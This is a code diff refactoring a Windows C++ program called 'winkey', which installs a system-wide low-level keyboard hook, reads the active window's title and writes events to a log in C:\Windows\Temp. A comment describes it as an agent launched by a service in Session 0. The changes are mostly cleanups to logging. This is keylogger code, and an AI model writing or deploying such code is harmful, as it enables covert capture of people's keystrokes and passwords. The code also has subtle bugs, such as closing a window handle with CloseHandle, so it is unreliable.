@@ -10,23 +10,26 @@
 #pragma comment(lib, "User32.lib")
 #include <windows.h>
 #include <iostream>
-#include <psapi.h> // Pour GetModuleBaseName
+#include <psapi.h> // For GetModuleBaseName
+#include <string>
+#include <fstream>
 
-// TODO : rewrite log event because it sucks
-void LogEvent(const wchar_t *msg)
+void LogEvent(const std::wstring &message)
 {
-    const wchar_t *logPath = L"C:\\Windows\\Temp\\winkey.log";
-    FILE *f = nullptr;
-    errno_t err = _wfopen_s(&f, logPath, L"a+");
-    if (err != 0 || f == nullptr)
+    std::wstring logPath = L"C:\\Windows\\Temp\\winkey.log";
+
+    std::wofstream file(logPath, std::ios::app);
+    if (!file)
     {
-        wchar_t buf[256];
-        swprintf_s(buf, L"Failed to open log file, errno=%d, GetLastError=%lu", err, GetLastError());
-        OutputDebugStringW(buf); // can see that with DebugView
+        std::wstring buf =
+            L"Failed to open log file: " + logPath +
+            L", GetLastError=" + std::to_wstring(GetLastError());
+
+        OutputDebugStringW(buf.c_str());
         return;
     }
-    fwprintf(f, L"%s\n", msg);
-    fclose(f);
+
+    file << message << L'\n';
 }
 
 std::wstring GetActiveProcessName()
@@ -35,26 +38,15 @@ std::wstring GetActiveProcessName()
 
     if (hwnd == 0)
     {
-        wchar_t buf[40];
-        swprintf_s(buf, L"GetForegroundWindow failed\n");
-        LogEvent(buf);
+        LogEvent(L"GetForegroundWindow failed\n");
+        return L"Unknown";
     }
-    // DWORD processId;
-    // GetWindowThreadProcessId(hwnd, &processId); // Récupère le PID
-
-    // HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
-    // if (hProcess == NULL)
-    // {
-    //     return (L"Unknown");
-    // }
     wchar_t windowTitle[1024];
     GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
-    // CloseHandle(hProcess);
     CloseHandle(hwnd);
     return (std::wstring(windowTitle));
 }
 
-// Fonction de rappel (Callback)
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
@@ -78,7 +70,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 // The agent (launched as Session 1 by the service in Session 0)
 int main()
 {
-    LogEvent(L"Entered proc main\n");
     HHOOK hKeyboardHook;
     // Hook installation
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
